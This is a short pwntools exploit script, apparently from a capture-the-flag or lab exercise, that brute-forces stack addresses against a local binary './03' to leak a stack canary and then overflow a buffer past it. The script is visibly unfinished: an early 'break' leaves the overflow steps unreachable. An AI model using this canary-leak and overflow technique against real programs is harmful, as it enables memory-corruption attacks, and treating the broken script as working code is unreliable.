from pwn import *

stack_range = 0x1000000000000
addresses = []
for x in range(0x7fffffffb000, 0x7ffffffff000, 4):
    try:
        io = process(['setarch','-R', './03'])
        possible_canary_address = p64(x)
        first_dummy = io.sendlineafter(b'. ', cyclic(32)+possible_canary_address)

        
        maybeCanary = io.recvuntil(b'.').strip().decode().split(' ')[-1].replace('line)\n', '').replace('.', '')

        print(maybeCanary)
        break


        canary = p64(int(maybeCanary, 16))
        io.send(cyclic(48) + canary)

        print(f"Maybe canary is: {maybeCanary}")


        io.shutdown('out')
        

        if io.poll() != -11 and io.poll() != None:
            print(f"SUCCEEEED, {x=}")
            break

        io.close()
    except:
        io.close()
        pass
